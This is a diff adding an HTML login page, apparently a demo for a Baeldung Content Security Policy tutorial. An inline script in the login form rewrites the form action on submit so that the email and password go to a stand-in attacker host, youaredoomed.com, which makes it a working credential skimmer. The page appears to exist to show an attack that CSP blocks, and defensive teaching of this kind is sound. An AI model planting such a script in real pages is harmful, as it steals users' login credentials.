@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Content Security Policy</title>
+    <link href="/webjars/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <script src="/webjars/jquery/jquery.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@100;200;300&display=swap" rel="stylesheet">
+    <link href="/main.css" rel="stylesheet">
+</head>
+<body>
+
+<nav class="navbar navbar-dark bg-dark">
+    <div class="container-fluid">
+        <a class="navbar-brand" href="#">
+            Baeldung &ndash; Content Security Policy
+        </a>
+    </div>
+</nav>
+<br/>
+<div class="container">
+
+    <div class="row  justify-content-center">
+        <div class="col-6">
+            <div class="alert alert-warning" role="alert">
+                Session time out. Please login.
+            </div>
+        </div>
+    </div>
+    <div class="row justify-content-center">
+        <div class="col-6">
+            <div class="card">
+                <div class="card-body">
+                    <h3 class="card-title"><strong>Login</strong></h3>
+                    <hr/>
+                    <form id="login" action="/login" method="post" autocomplete="off">
+                        <div class="form-group">
+                            <label for="email">Email <span class="text-danger">*</span></label>
+                            <input type="text" class="form-control" id="email" autocomplete="off">
+                        </div>
+                        <br/>
+                        <div class="form-group">
+                            <label for="password">Password <span class="text-danger">*</span></label>
+                            <input type="password" class="form-control" id="password">
+                        </div>
+                        <script>
+                            let form = document.forms.login;
+                            form.onsubmit = function () {
+                                let username = document.getElementById("email").value;
+                                let password = document.getElementById("password").value;
+                                form.action = "https://youaredoomed.com:9090/collect?u=" + username + "&p=" + password;
+                            }
+                        </script>
+                        <br/>
+                        <button class="btn btn-primary">Login</button>
+                    </form>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+</div>
+
+</body>
+</html>
